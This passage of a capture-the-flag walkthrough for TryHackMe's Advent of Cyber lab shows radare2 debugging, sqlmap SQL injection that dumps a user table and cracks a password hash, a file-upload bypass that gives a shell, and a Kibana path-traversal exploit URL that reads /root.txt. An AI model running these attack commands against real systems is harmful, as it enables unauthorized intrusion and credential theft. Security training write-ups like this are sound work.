    ![start](https://user-images.githubusercontent.com/32188816/82866575-6e64fc00-9ee6-11ea-9ff0-982fcb411f9f.png)

  2.  `dc` to execute the function to the break-point and `px @ rbp-0x4` to view the `local_4h` variables initial value

    ![done](https://user-images.githubusercontent.com/32188816/82866578-6f962900-9ee6-11ea-8762-4757f8523b5b.png)

As we can see, the value of `local_4h` is set to 6.




## Task 27 -- [Day 22] If Santa, Then Christmas
This is nearly the same as the last task. We start by loading up r2 in debug mode and setting our analyses to all public symbols with `aa`. Both of these variables just need to be analyzed at the end of the `main()` function, so we can achieve that with one break-point:

  1. `db 0x00400b71` - set a break-point at the end of main

    ![bp](https://user-images.githubusercontent.com/32188816/82867266-c4866f00-9ee7-11ea-9818-744ac3e80330.png)


  2. `dc` to execute the function up until the break-point and run `px @ rbp-0x8` to view the value of `local_8h` then `px @ rbp-0x4` to view the value of `local_4h`

    ![done2](https://user-images.githubusercontent.com/32188816/82867271-c5b79c00-9ee7-11ea-9a98-e71df685f232.png)

### 1 - what is the value of local_8h before the end of the main function?
```
9
```

### 2 - what is the value of local_4h before the end of the main function?
```
2
```



## Task 28 -- [Day 23] LapLANd (SQL Injection)
```
export IP=10.10.87.99
```

### 1 - Which field is SQL injectable? Use the input name used in the HTML code.
Initial nmap scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/lapland$ nmap -sC -sV -Pn -n nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 20:42 MDT
Unable to split netmask from target expression: "nmap/initial"
Nmap scan report for 10.10.87.99
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f9:14:0a:5b:19:0c:4a:e9:3a:12:d9:2c:6c:7f:76:d5 (RSA)
|   256 cf:ee:bb:bd:3b:1c:90:0b:a7:bd:79:7c:4f:a2:3e:1e (ECDSA)
|_  256 d7:27:b9:e0:0f:c4:a8:ef:83:20:d1:ae:c2:cb:5a:57 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Welcome to LapLANd!
|_Requested resource was register.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.41 seconds
```

Running sqlmap finds the vulnerable fields:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/lapland$ sqlmap -u http://10.10.87.99/register.php --forms --dump --risk=3 --level=5
```

Running the command after some time finds the following:

```bash
[21:49:26] [INFO] POST parameter 'log_email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

```bash
POST parameter 'log_email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 5092 HTTP(s) requests:
---
Parameter: log_email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: log_email=kmGF' AND (SELECT 4416 FROM (SELECT(SLEEP(5)))HfqB)-- GZAu&log_password=&login_button=Login
---
```

Exploiting this sqlmap gives us some useful information:

```bash
[21:53:42] [INFO] fetching tables for database: 'social'
[21:53:42] [INFO] fetching number of tables for database 'social'
[21:53:42] [INFO] retrieved: 8
[21:53:47] [INFO] retrieved: comments
[21:54:22] [INFO] retrieved: friend_requests
[21:55:26] [INFO] retrieved: likes
[21:55:48] [INFO] retrieved: messages
[21:56:19] [INFO] retrieved: notifications
[21:57:15] [INFO] retrieved: posts
[21:57:41] [INFO] retrieved: trends
[21:58:09] [INFO] retrieved: users
[21:58:31] [INFO] fetching columns for table 'likes' in database 'social'
[21:58:31] [INFO] retrieved: 3
[21:58:35] [INFO] retrieved: id
[21:58:44] [INFO] retrieved: username
[21:59:16] [INFO] retrieved: post_id
```


### 2 - What is Santa Claus' email address?
For this information we can continue to wait on the previous command to try to dump the entire database, but we know that the database name is `social` and the table name is `users`, so we can just tell sqlmap to drop only that table:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/lapland$ sqlmap -u http://10.10.87.99/register.php --forms --risk=3 --level=5 -D social -T users --dump
```

```bash
[22:18:15] [INFO] retrieved:
[22:18:17] [INFO] adjusting time delay to 1 second due to good response times
f1267830a78c0b59acc06b05694b2e28
[22:20:55] [INFO] retrieved: bigman@shefesh.com
[22:22:13] [INFO] retrieved: Santa
```


### 3 - What is Santa Claus' plaintext password?
```bash
[22:18:15] [INFO] retrieved:
[22:18:17] [INFO] adjusting time delay to 1 second due to good response times
f1267830a78c0b59acc06b05694b2e28
[22:20:55] [INFO] retrieved: bigman@shefesh.com
[22:22:13] [INFO] retrieved: Santa
```

Google `f1267830a78c0b59acc06b05694b2e28` or crack with JtR or hashcat, the password is `saltnpepper`

### 4 - Santa has a secret! Which station is he meeting Mrs Mistletoe in?
```SQL
Database: social
Table: messages
[1 entry]
+------+--------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+--------+---------+-------------+-----------------+
| id   | body                                                                                                                                       | date                | opened | viewed | deleted | user_to     | user_from       |
+------+--------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+--------+---------+-------------+-----------------+
| 1    | Santa, I think my son Michael saw us kissing underneath the misteltoe last night! Meet me under the clock in Waterloo station at Midnight. | 2019-12-22 20:44:23 | yes    | yes    | no      | santa_claus | mommy_mistletoe |
+------+--------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+--------+---------+-------------+-----------------+
```

### 5 - Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/

The file upload was a bit tricky. It does not except `.php` files, so I tried `.php3`, `.php4`, '.php5' and none of those worked. Finally, uploading the file with an extension of `.phtml` worked and caused the page to render it immediately and we caught the shell. After that navigating around on the file system we can find the flag:

```bash
www-data@server:/$ cd /home
cd /home
www-data@server:/home$ ls
ls
user
www-data@server:/home$ cd user
cd user
www-data@server:/home/user$ ls
ls
flag.txt
www-data@server:/home/user$ cat flag.txt
cat flag.txt
@@@########################################################################@@@@
@@@(((((((((((((((((((((((((((((((((((%#(((((((((((((((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((((((((((((%%,*%%(((((((((((((((((((((((((((((((((@@@@
@@@((((((((((((((((((&%(((((((((((%#*/##(((((((((((#@%%((((((((((((((((((@@@@
@@@(((((((((((((((((((%(//%((((((#(//,*%%((((((#/,(#(((((((((((((((((((@@@@
@@@((((((((((((((((((((#(*%#/##,*#&%%%&%%,*%###%%/*&(((((((((((((((((((((@@@@
@@@(((((((((((((((((((((#(&@(*(#(##%&%#%%%%#((%,*%&((((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((@%%((#(**/*#,*(*//*/(((%%@(((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((%%#(##,#**,##%#,*(#*#((%%#(((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((#/#*(,*/((((((((((/****%*%(((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((#(&/,,,,,,,,,,,,,,/%&&/#(((((((((((((((((((((((@@@@
@@@((((((((((((((((((((((((#&((##(/********/(#(((&%((((((((((((((((((((((((@@@@
@@@((((((((((((((((((((((((((((((((########((((((((((((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((((((((((((#((((((((((((((((((((((((((((((((((((((@@@@
@@@(((((((((((((((((((((((((%/((,     .      *##/%(((((((((((((((((((((((((@@@@
@@@((((((((%((((((%((((((%###  .      .       .  %%(%((((((%((((((&((((((((@@@@
@@@((((((%/,##((%/ #(((((%###  .   .  .       .. %%#%(((((&.(&((%( (#((((((@@@@
@@@(((((#*,(%*%,%%/ (##((%###  .  .   .        * %%#%(((%# (%###(%( #((((((@@@@
@@@((#%%.*#%,*#,/((# %(#%%### /*,./..*..,/ , ,*/ %%#%#%(/ (%,%/,%.(#,*##%((@@@@
@@@(((# #(#,/(*(#./## /((%### /*/%&&,(..,/#,%.(  %%#%(#./%#,/%.(%,(##* #(((@@@@
@@%#((#(/##%/%%(#%#%(%###.**.,*,.*.,,. **.*  %%#%(%#%#/%&*%%*&%((#((##@@@
@@&%(((#,##(*#%/%(,## #((%###  .(     .    ,. .  %%#%((#.#((,%(*%(,##.((((#&@@@
@@@@((((# %#,/#,#/(#(((((%###  .      .       .  %%#%(((((,#*#*#/,(% #((((&@@@@
@@@&((((((%#&,#(/%(((((%###..,/#####&%#####*. .%%#%(((((##&*##.%##((((((@@@@@
@@@@&((((((##(((#%(((((((%#(####//(##%@&%###((####(#%((((((###((###((((((%#@@@@
@@@@@((((((((((((((((((((#%%%%%%%%%%%%%#%%%%%%%%%%%%%((((((((((((((((((((@,@@@@
@@@@&@(((((((((((((((((((((((((((((((##%(#((((((((((((((((((((((((((((((#.@@@@@
@@@@@ #((((((((((((((((((((((((((((%/%&&%%##((((((((((((((((((((((((((((@@@@@@@
@@@@@@@#(((((((((((((((((((((((((%.( /%@,( (/#(((((((((((((((((((((((((@@@@@@@@
@@@@@@@&((((((((((((((((((((((%#.(   /&%*/   (.(%(((((((((((((((((((((@%@@@@@@@
@@@@@@@@%%((((((((((((((((#&(#.* . ** /@./,,.. / &(%((((((((((((((((#@,@@@@@@@@
@@@@@@@@@.&(((((((((((((((&@@&%, /#,  /%, .#&@@@%%#((((((((((((((%#@@@@@@@@@@
@@@@@@@@@@%@((((((((((((((#&..,,%&@. #//(( /@@#., ,(((((((((((((@%@@@@@@@@@@@
@@@@@@@@@@@@@&(((((((((((((#,(  ,,,,#(/(#&@(,,.  /#(((((((((((((&%@@@@@@@@@@@@@
%%#%&%@@@@@@@@&%((((((((((((#,(   *,  ,&.   ,., /#((((((((((((%@#@@@@@@@@&&%%%&
/***/*%@@@@@@@@*&&(((((((((((%*  .#%@  ((*%&*, .,#((((((((((&@@@@@@@@@&***,**
@#(,(%#@@@@@@@@@@*%@(((((((((#./,@&@. *,*.*@@#*,/(((((((((& @@@@@@@@@@@@@%#*((@
&/#%//&@@@@@@@@@@@@@,&&(((((((%#&@((       .%@##&(((((#@(#@@@@@@@@@@@@@@@/%(((&
#(/,,#&%@@@@@@@@@@@@@(%@(((((#%(%.,(#%#(,(%&(((#@.@@@@@@@@@@@@@@%%#,..(%*##
&((&*%##*/.   ,*#%%#&%/&%@ /@((((((((((((((((#@@@@@@(&%&%%(/,.    ,/# %,@@/%%
 %/,(,,#,%@,.&*%(,%(//&%@@@@@@@@@%#((((#&@&@@@@@@@@.#%%*%.( &*@..@@*%%%#*%%
@@#%*,*%*(& /( *&/%#&*,..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,/#&(@. *(&(%./(*../@@@@
@@@@@@@#,  . ,*,%.@*(##&%#&@@@@@@@@@@@@@@@@@@@@@@@@@#%%(((#,(&,/     ,#&%@@@@@@
@@@@@@@@@@@@@@ #%@%%&(@/%**,,*(#%#@&&%%&&@#%##*,...*#/@/(#@%%, @@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@/*&,%,*#//%.**.(. ##..(%*(.,@,#@//#%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@&%(@%#,##&**%(&/,@ @.@& &. */..@(*@%(#%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%/**/,,#(%# %.& &,,,/,@#/%/,,,*(&%/@@@@@@@@@@@@@@@@@@@@@

MERRY CHRISTMAS FROM SHEFFIELD, UK

CREATED IN COLLABORATION WITH TRYHACKME.COM

THM{SHELLS_IN_MY_EGGNOG}

```


## Task 29 -- [Day 24] Elf Stalk
```
export IP=10.10.187.60
```

Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_stalk$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 23:23 MDT
Nmap scan report for 10.10.187.60
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 0a:ee:6d:36:10:72:ce:f0:ef:40:9e:63:52:a9:86:44 (RSA)
|   256 11:6e:8f:7f:15:66:e3:03:b1:c4:55:f8:e7:bb:59:23 (ECDSA)
|_  256 b3:12:7a:7f:ac:89:72:c9:25:88:96:20:ad:c7:5b:4a (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.7.4)
|_http-server-header: SimpleHTTP/0.6 Python/3.7.4
|_http-title: Directory listing for /
9200/tcp open  http    Elasticsearch REST API 6.4.2 (name: sn6hfBl; cluster: elasticsearch; Lucene 7.4.0)
| http-methods:
|_  Potentially risky methods: DELETE
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.18 seconds
```

### 1 - Find the password in the database
For this I wrote a simple python script that uses the json library to print the data out in a nice format. The solution is a simple query using `_search?q=password`. This is what the script looked like:

```python
#!/usr/local/bin/python3

import requests
import json

url = 'http://10.10.244.246:9200/_search?q=password'
headers = {'Content-Type': 'application/json'}
r = requests.get(url=url, headers=headers)
print(json.dumps(r.json(), indent=4))
```

And this is the result of running the script:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf_stalk$ ./scripy.py
{
    "took": 14,
    "timed_out": false,
    "_shards": {
        "total": 6,
        "successful": 6,
        "skipped": 0,
        "failed": 0
    },
    "hits": {
        "total": 1,
        "max_score": 2.0136302,
        "hits": [
            {
                "_index": "messages",
                "_type": "_doc",
                "_id": "73",
                "_score": 2.0136302,
                "_source": {
                    "sender": "mary",
                    "receiver": "wendy",
                    "message": "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
                }
            }
        ]
    }
}
```

### 2 - Read the contents of the /root.txt file
```
someELKfun
```

Researhcing Kibana version 6.4.2 from our scan results reveals a LFI vulnerability that we can leverage to view `/root.txt` ([CVE-2018-17246](https://www.cvedetails.com/cve/CVE-2018-17246/)).

Starting with a PoC to include `/etc/passwd` helped, because it showed to look for errors in the log file running on port 8000. After trying various directory traversals and checking the log after each one we were able to get the contents of `/etc/shadow`:

```
{"message":"SyntaxError: /etc/passwd: Unexpected token, expected ; (1:8)\n> 1 | root:x:0:0:root:/root:/bin/bash\n    |         ^\n  2 | bin:x:1:1:bin:/bin:/sbin/nologin\n  3 | daemon:x:2:2:daemon:/sbin:/sbin/nologin\n  4 | adm:x:3:4:adm:/var/adm:/sbin/nologin\n
```

We get a SyntaxError because the contents of `/etc/shadow` were incldued int he program. Moving from here, we can create the payload for `root.txt` which looked like this:

```
http://:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../root.txt
```

Once this is executed we can check the kibana log that is avalable on port 8000, and viewing the text we can find the following error message:

```
{"message":"ReferenceError: someELKfun is not defined\n
```

This is because our file was included and the code is trying to execute `someELFfun` as if it were a function, hence the ReferenceError.

## Task 30 -- [Day 25] Challenge-less
No answer needed.
